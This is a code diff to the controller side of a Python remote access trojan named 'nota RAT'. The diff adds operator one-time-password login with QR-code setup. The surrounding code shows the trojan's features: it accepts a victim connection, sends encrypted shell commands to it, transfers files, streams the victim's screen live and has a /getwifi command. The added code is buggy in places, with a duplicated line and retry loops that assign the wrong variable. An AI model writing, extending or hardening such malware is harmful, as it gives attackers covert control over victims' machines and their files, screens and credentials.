@@ -1,4 +1,4 @@
-import socket, argparse, subprocess, re, time, os, pyotp, maskpass
+import socket, argparse, subprocess, re, time, os, pyotp, maskpass, qrcode
 from sys import platform
 from vidstream import StreamingServer
 from threading import Thread
@@ -67,35 +67,76 @@ $$/   $$/  $$$$$$/     $$$$/   $$$$$$$/       $$/       $$$$$$$/    $$$$/
                                            {END}nota RAT v1.0 | fluffydolphin                             
 """)
 
+if 'config.txt' in os.listdir():
+    file = open('config.txt', 'r')
+    f = file.read()
+    config = re.search("OTP=(.*)", f)
+    config = config.groups()
+    totp = str(config)
+    totp = totp.replace("(", "")
+    totp = totp.replace(")", "")
+    totp = totp.replace(",", "")
+    totp = totp.replace("'", "")
+    totp = totp.replace("'", "")
+    config = totp
+    if config == "no": 
+        print(f"\n[{IMPORTANT}] It is recommended to enable OTP\n")
+    else:
+        pwd = maskpass.askpass(prompt=f"\n[{IMPORTANT}] Enter code: ", mask="*")
+        totp = pyotp.TOTP(totp)
+        totp_verify = totp.verify(pwd)
 
-#pwd = maskpass.askpass(prompt=f"\n[{IMPORTANT}] Enter code: ", mask="*")
-#totp = pyotp.TOTP('Fluffydolphin')
-#totp_verify = totp.verify(pwd)
+        if totp_verify != True:
+            print(f"[{INFO}] Incorrect\n")
+            exit()
 
-#if totp_verify != True:
-    #print(f"[{INFO}] Incorrect\n")
-    #exit()
-
-#print(f"[{INFO}] Correct\n")
+        print(f"[{INFO}] Correct\n")
+else: 
+    with open('config.txt', 'w') as f:
+        data = input(f"[{IMPORTANT}] Do you want to enable OTP (y/n)? ")
+        while(data != "y" and data != "n"):
+                print(f"[{FAILED}] (y/n) \n{END}")
+                time.sleep(0.4)
+                data = input(f"[{IMPORTANT}] Do you want to enable OTP (y/n)? ")
+        if data == "n":
+            print(f"\n[{IMPORTANT}] It is recommended to enable OTP\n")
+            f.writelines("OTP=no")
+        if data == "y":
+            uri_name = input(f"[{IMPORTANT}] TOTP name? ")
+            uri_issuer_name = input(f"[{IMPORTANT}] TOTP issuer name? ")
+            secret_key = input(f"[{IMPORTANT}] TOTP secret key? ")
+            uri = pyotp.totp.TOTP(secret_key).provisioning_uri(name=uri_name, issuer_name=uri_issuer_name)
+            img = qrcode.make(uri)
+            img.save('nota-RAT_qrcode.png')
+            f.writelines(f"OTP={secret_key}")
+            print(f"\n[{INFO}] Successfully generated qrcode in CWD")
+            print(f"[{INFO}] Authentication URI: {uri}")
+            pwd = maskpass.askpass(prompt=f"\n[{IMPORTANT}] Enter code: ", mask="*")
+            totp = pyotp.TOTP(secret_key)
+            totp_verify = totp.verify(pwd)
+            if totp_verify != True:
+                print(f"[{INFO}] Incorrect\n")
+                exit()
+        f.close()
 
 s = socket.socket()
 
 s.bind((SERVER_HOST, SERVER_PORT))
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.listen(5)
-print(f"[{IMPORTANT}] {BOLD}Awaiting connection on {SERVER_HOST}:{SERVER_PORT} ......{END}")
+print(f"\n[{IMPORTANT}] {BOLD}Awaiting connection on {SERVER_HOST}:{SERVER_PORT} ......{END}")
 
 client_socket, client_address = s.accept()
 print(f"[{IMPORTANT}] {BOLD}{client_address[0]}:{client_address[1]} Connected! \n{END}")
 time.sleep(1)
-print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt ......{END}', end = '\n\n') #yes I stole this from hoax get over it
+print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt ......{END}', end = '\n\n')
 time.sleep(1.8)
 
 if args.discord:
     if platform == 'win32':
         pings_command = subprocess.run(["ping", f"{client_socket.getpeername()[0]}"], capture_output = True).stdout.decode()
         ping = re.search(", Average = (.*)\r", pings_command)
-        ping = ping.groups()
+        ping = ping.group()
     else: 
         pings_command = subprocess.run(["ping", f"{client_socket.getpeername()[0]}", "-c", "4"], capture_output = True).stdout.decode()
         ping = re.split("/", pings_command)
@@ -173,7 +214,53 @@ while True:
         \r  /exit/quit/q               Close session and exit.
         {END}''')
             continue
-        if command != "/clear" and command != "/help":
+        if command == "/OTP":
+            file = open('config.txt')
+            f = file.read()
+            config = re.search("OTP=(.*)", f)
+            config = re.search("OTP=(.*)", f)
+            config = config.groups()
+            config = str(config)
+            config = config.replace("(", "")
+            config = config.replace(")", "")
+            config = config.replace(",", "")
+            config = config.replace("'", "")
+            config = config.replace("'", "")
+            if config == 'no':
+                choice = input(f"[{IMPORTANT}] Do you want to enable OTP (y/n)? ")
+                while(choice  != "y" and choice  != "n"):
+                    print(f"[{FAILED}] (y/n) \n{END}")
+                    time.sleep(0.4)
+                    data = input(f"[{IMPORTANT}] Do you want to enable OTP (y/n)? ")
+                if choice == "y":
+                    uri_name = input(f"[{IMPORTANT}] TOTP name? ")
+                    uri_issuer_name = input(f"[{IMPORTANT}] TOTP issuer name? ")
+                    secret_key = input(f"[{IMPORTANT}] TOTP secret key? ")
+                    uri = pyotp.totp.TOTP(secret_key).provisioning_uri(name=uri_name, issuer_name=uri_issuer_name)
+                    img = qrcode.make(uri)
+                    img.save('nota-RAT_qrcode.png')
+                    with open("config.txt", 'w') as j:
+                        j.writelines(f"OTP={secret_key}")
+                        j.close()
+                    print(f"\n[{INFO}] Successfully generated qrcode in CWD")
+                    print(f"[{INFO}] Authentication URI: {uri}")
+                    continue
+                if choice == "n":
+                    continue
+            else:
+                choice = input(f"[{IMPORTANT}] Do you want to disable OTP (y/n)? ")
+                while(choice  != "y" and choice  != "n"):
+                    print(f"[{FAILED}] (y/n) \n{END}")
+                    time.sleep(0.4)
+                    data = input(f"[{IMPORTANT}] Do you want to disable OTP (y/n)? ")
+                if choice == "y":
+                    with open("config.txt", "w") as g:
+                        g.write("OTP=no")
+                        g.close()
+                    continue
+                if choice == "n":
+                    continue
+        if command != "/clear" and command != "/help" and command != "/OTP":
             commandz = Fernet(key).encrypt(command.encode())
             client_socket.send(commandz)
         if command == "/getfile":
@@ -234,7 +321,7 @@ while True:
                 server_state = client_socket.recv(BUFFER_SIZE)
                 server_state = Fernet(key).decrypt(server_state).decode()
                 print(f"[{IMPORTANT}] {server_state}")
-            if server_location == "yes":
+            if server_location == "y":
                 print(f"\n[{IMPORTANT}] Found live Streaming Server on RAT")
             print(f"[{IMPORTANT}] Starting live Streaming Server ......")
             p = Thread(target=receiver.start_server)
@@ -255,7 +342,7 @@ while True:
         output = client_socket.recv(BUFFER_SIZE)
         output = Fernet(key).decrypt(output).decode()
         results, cwd = output.split(SEPARATOR)
-        if command != "/getfile" and command != "/sendfile" and command != "/getlive" and command != "/stoplive" and command != "/getwifi":
+        if command != "/getfile" and command != "/sendfile" and command != "/getlive" and command != "/stoplive" and command != "/getwifi" and command != "/OTP":
             print(f"{GREEN}{results}{END}")
         else: continue
     except KeyboardInterrupt:
